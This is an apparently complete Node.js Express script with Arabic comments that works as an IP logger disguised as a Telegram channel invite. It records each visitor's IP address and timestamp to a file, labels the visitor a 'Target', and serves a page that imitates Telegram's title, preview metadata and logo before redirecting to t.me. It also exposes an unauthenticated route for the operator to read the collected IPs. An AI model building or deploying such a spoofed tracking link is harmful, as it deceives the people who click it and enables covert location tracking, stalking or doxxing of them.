const express = require('express');
const fs = require('fs'); // استدعاء موديل التعامل مع الملفات
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/uUl8iPwh5iYTVk', (req, res) => {
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log("Target Link Clicked! Visitor IP: " + visitorIp);
    
    // تجهيز السطر المراد كتابته: التاريخ + الـ IP
    const logEntry = `${new Date().toISOString()} - IP: ${visitorIp}\n`;
    
    // حفظ السطر داخل ملف اسمه ips.txt
    fs.appendFile('ips.txt', logEntry, (err) => {
        if (err) console.log("Error writing to file: ", err);
    });
    
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <title>Telegram: Join Channel</title>
            <meta property="og:title" content="Telegram: Join Channel">
            <meta property="og:description" content="اضغط للانضمام إلى القناة الرسمية عبر تليغرام">
            <meta property="og:image" content="https://telegram.org/img/t_logo.png">
            <meta property="og:type" content="website">
            <script>
                window.location.href = "https://t.me/uUl8iPwh5iYTVk";
            </script>
        </head>
        <body>
            <p style="text-align: center; margin-top: 50px; font-family: sans-serif; color: #555;">جاري فتح تليغرام...</p>
        </body>
        </html>
    `);
});

// مسار خاص بك أنت فقط لكي تفتح المتصفح وتشوف الـ IPs المخزنة داخل الملف
app.get('/view-logs', (req, res) => {
    fs.readFile('ips.txt', 'utf8', (err, data) => {
        if (err) {
            return res.send('لا توجد أي زيارات مسجلة حتى الآن.');
        }
        res.type('text/plain').send(data);
    });
});

app.get('/', (req, res) => {
    res.send('Server is active.');
});

app.listen(PORT, () => {
    console.log("Server is running...");
});
